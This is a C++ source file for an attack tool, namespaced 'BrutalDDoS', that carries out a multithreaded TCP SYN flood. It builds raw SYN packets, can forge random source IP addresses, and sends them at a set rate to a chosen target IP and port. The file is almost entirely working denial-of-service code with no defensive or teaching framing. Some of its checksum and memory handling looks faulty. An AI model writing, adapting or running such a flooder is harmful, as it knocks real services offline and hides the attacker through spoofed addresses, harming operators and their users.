#include "SynFlood.h"
#include <iostream>
#include <random>
#include <cstring>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <sys/socket.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>

namespace BrutalDDoS {
namespace Network {
namespace Protocols {

// Helper to convert IP string to in_addr
static uint32_t ip_to_uint32(const std::string& ip) {
    struct in_addr addr;
    if (inet_pton(AF_INET, ip.c_str(), &addr) == 1) {
        return ntohl(addr.s_addr);
    }
    return 0;
}

// Helper to generate random IP
std::string SynFlood::generate_spoofed_ip() {
    static thread_local std::mt19937 rng(std::random_device{}());
    static thread_local std::uniform_int_distribution<uint32_t> dist(1, 254);
    
    uint8_t b1 = dist(rng);
    uint8_t b2 = dist(rng);
    uint8_t b3 = dist(rng);
    uint8_t b4 = dist(rng);
    
    char ip[16];
    snprintf(ip, sizeof(ip), "%d.%d.%d.%d", b1, b2, b3, b4);
    return std::string(ip);
}

uint16_t SynFlood::ip_checksum(uint16_t* data, size_t length) {
    uint32_t sum = 0;
    while (length > 1) {
        sum += *data++;
        length -= 2;
    }
    if (length) {
        sum += *(uint8_t*)data;
    }
    
    while (sum >> 16) {
        sum = (sum & 0xffff) + (sum >> 16);
    }
    
    return ~sum;
}

uint16_t SynFlood::tcp_checksum(uint16_t* data, size_t length, uint32_t src_ip, uint32_t dst_ip) {
    uint32_t sum = 0;
    
    // Pseudo header
    sum += (src_ip >> 16) & 0xffff;
    sum += src_ip & 0xffff;
    sum += (dst_ip >> 16) & 0xffff;
    sum += dst_ip & 0xffff;
    sum += htons(IPPROTO_TCP);
    sum += htons((uint16_t)length);
    
    while (length > 1) {
        sum += *data++;
        length -= 2;
    }
    if (length) {
        sum += *(uint8_t*)data;
    }
    
    while (sum >> 16) {
        sum = (sum & 0xffff) + (sum >> 16);
    }
    
    return ~sum;
}

SynFlood::SynFlood(const Config& config) 
    : config_(config), running_(false), stopped_(false) {
    memset(&current_stats_, 0, sizeof(current_stats_));
    last_time_ = std::chrono::steady_clock::now();
    packets_this_second_ = 0;
}

SynFlood::~SynFlood() {
    stop();
}

void SynFlood::start() {
    if (running_) return;
    
    running_ = true;
    stopped_ = false;
    
    // Create raw socket for sending SYN packets
    int sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
    if (sockfd < 0) {
        std::cerr << "[SYN Flood] Error creating raw socket: " << strerror(errno) << std::endl;
        return;
    }
    
    // Set IP header inclusion
    int ip_header_on = 1;
    if (setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, &ip_header_on, sizeof(ip_header_on)) < 0) {
        std::cerr << "[SYN Flood] Error setting IP_HDRINCL: " << strerror(errno) << std::endl;
        close(sockfd);
        return;
    }
    
    // Set timeout for recv (not strictly necessary for SYN flood but good practice)
    struct timeval tv;
    tv.tv_sec = 0;
    tv.tv_usec = 1000; // 1ms
    setsockopt(sockfd, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
    
    // Launch threads
    for (int i = 0; i < config_.num_threads; ++i) {
        threads_.emplace_back(&SynFlood::worker_thread, this, i);
    }
    
    if (config_.verbose) {
        std::cout << "[SYN Flood] Started with " << config_.num_threads << " threads" << std::endl;
    }
}

void SynFlood::stop() {
    if (!running_) return;
    
    stopped_ = true;
    
    for (auto& t : threads_) {
        if (t.joinable()) {
            t.join();
        }
    }
    
    threads_.clear();
    running_ = false;
    
    if (config_.verbose) {
        std::cout << "[SYN Flood] Stopped. Final Stats:" << std::endl;
        std::cout << "  Total SYN Sent: " << current_stats_.total_syn_sent << std::endl;
        std::cout << "  Bytes Sent: " << current_stats_.bytes_sent << std::endl;
        std::cout << "  Errors: " << current_stats_.errors << std::endl;
    }
}

void SynFlood::worker_thread(int thread_id) {
    // Each thread maintains its own socket
    int sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
    if (sockfd < 0) {
        std::cerr << "[SYN Flood Thread " << thread_id << "] Error creating socket: " << strerror(errno) << std::endl;
        return;
    }
    
    int ip_header_on = 1;
    if (setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, &ip_header_on, sizeof(ip_header_on)) < 0) {
        std::cerr << "[SYN Flood Thread " << thread_id << "] Error setting IP_HDRINCL: " << strerror(errno) << std::endl;
        close(sockfd);
        return;
    }
    
    // Target address structure
    struct sockaddr_in target_addr;
    memset(&target_addr, 0, sizeof(target_addr));
    target_addr.sin_family = AF_INET;
    target_addr.sin_port = htons(config_.target_port);
    inet_pton(AF_INET, config_.target_ip.c_str(), &target_addr.sin_addr);
    
    // Rate calculation per thread
    uint64_t syns_per_thread_per_second = config_.syn_rate_per_second / config_.num_threads;
    if (syns_per_thread_per_second == 0) syns_per_thread_per_second = 1;
    
    auto start_time = std::chrono::steady_clock::now();
    uint64_t packets_sent = 0;
    uint64_t packets_this_interval = 0;
    
    while (!stopped_) {
        auto now = std::chrono::steady_clock::now();
        auto elapsed = std::chrono::duration_cast<std::chrono::milliseconds>(now - start_time).count();
        
        // Reset interval counter every second
        if (elapsed >= 1000) {
            start_time = std::chrono::steady_clock::now();
            packets_this_interval = 0;
        }
        
        // Check if we've exceeded our rate limit for this interval
        if (packets_this_interval >= syns_per_thread_per_second) {
            std::this_thread::sleep_for(std::chrono::milliseconds(1));
            continue;
        }
        
        // Generate source parameters
        std::string src_ip = config_.spoof_ips ? generate_spoofed_ip() : config_.target_ip; // Or use local IP
        uint16_t src_port = config_.src_port_min + (rand() % (config_.src_port_max - config_.src_port_min));
        uint16_t dst_port = config_.target_port;
        
        // Generate random sequence number
        uint32_t seq_num = rand();
        uint32_t ack_num = 0;
        
        // Build IP Header
        struct iphdr* ip_header = new iphdr[sizeof(iphdr)];
        memset(ip_header, 0, sizeof(iphdr));
        
        ip_header->version = 4;
        ip_header->ihl = 5;
        ip_header->tos = 0;
        ip_header->tot_len = htons(sizeof(iphdr) + sizeof(tcphdr));
        ip_header->id = htons(rand());
        ip_header->ttl = config_.ttl;
        ip_header->protocol = IPPROTO_TCP;
        ip_header->saddr = inet_addr(src_ip.c_str());
        ip_header->daddr = inet_addr(config_.target_ip.c_str());
        
        // Build TCP Header
        struct tcphdr* tcp_header = new tcphdr[sizeof(tcphdr)];
        memset(tcp_header, 0, sizeof(tcphdr));
        
        tcp_header->source = htons(src_port);
        tcp_header->dest = htons(dst_port);
        tcp_header->seq = htonl(seq_num);
        tcp_header->ack_seq = 0;
        tcp_header->doff = 5;
        tcp_header->fin = 0;
        tcp_header->syn = 1;
        tcp_header->rst = 0;
        tcp_header->psh = 0;
        tcp_header->ack = 0;
        tcp_header->urg = 0;
        tcp_header->window = htons(8192); // Random window size
        tcp_header->check = 0;
        tcp_header->urg_ptr = 0;
        
        // Calculate TCP checksum
        // We need to calculate checksum over pseudo header + TCP header
        // For simplicity, we'll create a buffer with pseudo header + TCP header
        uint8_t* tcp_buffer = new uint8_t[sizeof(tcphdr) + 12]; // 12 bytes for pseudo header
        memcpy(tcp_buffer + 12, tcp_header, sizeof(tcphdr));
        
        // Pseudo header
        uint32_t src_ip_uint = inet_addr(src_ip.c_str());
        uint32_t dst_ip_uint = inet_addr(config_.target_ip.c_str());
        
        uint16_t* pseudo_header = reinterpret_cast<uint16_t*>(tcp_buffer);
        *pseudo_header++ = (src_ip_uint >> 16) & 0xffff;
        *pseudo_header++ = src_ip_uint & 0xffff;
        *pseudo_header++ = (dst_ip_uint >> 16) & 0xffff;
        *pseudo_header++ = dst_ip_uint & 0xffff;
        *pseudo_header++ = 0; // Reserved
        *pseudo_header++ = IPPROTO_TCP;
        *pseudo_header++ = htons(sizeof(tcphdr));
        
        // Copy TCP header after pseudo header
        memcpy(reinterpret_cast<void*>(pseudo_header), tcp_header, sizeof(tcphdr));
        
        // Calculate checksum
        tcp_header->check = tcp_checksum(reinterpret_cast<uint16_t*>(tcp_buffer), sizeof(tcphdr) + 12, src_ip_uint, dst_ip_uint);
        
        delete[] tcp_buffer;
        
        // Combine IP and TCP headers into a single buffer
        uint8_t* packet = new uint8_t[sizeof(iphdr) + sizeof(tcphdr)];
        memcpy(packet, ip_header, sizeof(iphdr));
        memcpy(packet + sizeof(iphdr), tcp_header, sizeof(tcphdr));
        
        // Send packet
        ssize_t sent = sendto(sockfd, packet, sizeof(iphdr) + sizeof(tcphdr), 0, 
                             (struct sockaddr*)&target_addr, sizeof(target_addr));
        
        if (sent < 0) {
            std::lock_guard<std::mutex> lock(stats_mutex_);
            current_stats_.errors++;
        } else {
            packets_sent++;
            packets_this_interval++;
            
            std::lock_guard<std::mutex> lock(stats_mutex_);
            current_stats_.total_syn_sent++;
            current_stats_.bytes_sent += sent;
        }
        
        delete[] ip_header;
        delete[] tcp_header;
        delete[] packet;
    }
    
    close(sockfd);
}

SynFlood::Stats SynFlood::get_stats() const {
    std::lock_guard<std::mutex> lock(stats_mutex_);
    return current_stats_;
}

} // namespace Protocols
} // namespace Network
} // namespace BrutalDDoS
